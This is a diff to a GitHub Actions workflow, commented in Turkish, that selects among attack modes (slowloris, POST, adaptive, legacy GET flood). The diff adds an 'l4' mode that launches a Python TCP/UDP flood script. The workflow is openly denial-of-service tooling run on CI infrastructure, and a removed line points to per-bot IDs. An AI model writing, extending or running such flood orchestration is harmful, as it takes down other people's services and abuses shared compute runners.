@@ -63,6 +63,7 @@ on:
           - slowloris
           - post
           - adaptive
+          - l4
           - legacy
 
 jobs:
@@ -151,6 +152,10 @@ jobs:
               echo "script=.github/workflows/k6-script.js" >> $GITHUB_OUTPUT
               echo "mode_desc=LEGACY (basit GET flood)" >> $GITHUB_OUTPUT
               ;;
+            l4)
+              echo "script=L4_MODE" >> $GITHUB_OUTPUT
+              echo "mode_desc=L4 TCP/UDP FLOOD (Python socket)" >> $GITHUB_OUTPUT
+              ;;
             *)
               echo "script=.github/workflows/k6-flood-http.js" >> $GITHUB_OUTPUT
               echo "mode_desc=DEFAULT flood" >> $GITHUB_OUTPUT
@@ -175,16 +180,17 @@ jobs:
           echo "▶ Running: $SCRIPT"
           echo "▶ Mode: ${{ steps.script_select.outputs.mode_desc }}"
           echo ""
-          echo "═══════════════════════════════════════════════════════════════"
-          echo "  CANLI DURUM (her ~5s'de [LIVE bot=$BOT_ID] satiri gelir)"
-          echo "  Ayrica k6 kendi progress log'unu da 30s'de bir basar"
-          echo "═══════════════════════════════════════════════════════════════"
+          echo "============================================================="
+          echo "  CANLI DURUM (her ~5s'de [LIVE] satiri gelir)"
+          echo "============================================================="
           echo ""
 
-          # stdbuf -oL: line-buffered stdout (log satirlari canli aksin)
-          # --console-output=stdout: k6 console.log stdout'a
-          # --verbose: k6 kendi periyodik istatistiklerini ver
-          if [[ "${{ inputs.attack_mode }}" == "legacy" ]]; then
+          # L4 modu: k6 yerine Python script calistir
+          if [[ "${{ inputs.attack_mode }}" == "l4" ]]; then
+            echo ">>> L4 TCP/UDP FLOOD MODE <<<"
+            python3 -u .github/workflows/l4-flood.py
+            echo "L4 flood tamamlandi"
+          elif [[ "${{ inputs.attack_mode }}" == "legacy" ]]; then
             RPS_ARG=$([[ "$RPS" -gt 0 ]] && echo "--rps $RPS" || echo "")
             stdbuf -oL -eL k6 run \
               --no-color \
